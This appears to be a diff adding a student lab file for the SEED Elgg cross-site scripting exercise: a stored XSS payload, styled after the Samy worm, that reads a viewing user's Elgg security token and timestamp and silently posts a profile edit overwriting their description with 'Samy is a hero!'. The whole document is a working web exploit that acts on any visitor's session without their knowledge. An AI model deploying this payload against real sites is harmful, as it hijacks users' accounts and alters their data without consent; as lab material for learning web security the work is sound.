@@ -1,0 +1,20 @@
+<p>This is samy</p>
+<script id="worm" type="text/javascript">// <![CDATA[
+    var msg = 'Samy is a hero! Script by Yash, Ritesh & Ketaki';
+    var _ts=elgg.security.token.__elgg_ts;
+    var _token=elgg.security.token.__elgg_token;
+    var content ='&__elgg_token='+ _token +'&__elgg_ts='+ _ts + '&name=' + elgg.session.user.name + '&description=' + msg + '&guid=' + elgg.session.user.guid;
+    var sendurl = '/action/profile/edit';
+    console.log(sendurl);
+
+    if (elgg.session.user.guid != elgg.page_owner.guid) {
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Keep-Alive", "300");
+        Ajax.setRequestHeader("Connection", "keep-alive");
+        Ajax.setRequestHeader("Cookie", document.cookie);
+        Ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
+// ]]></script>
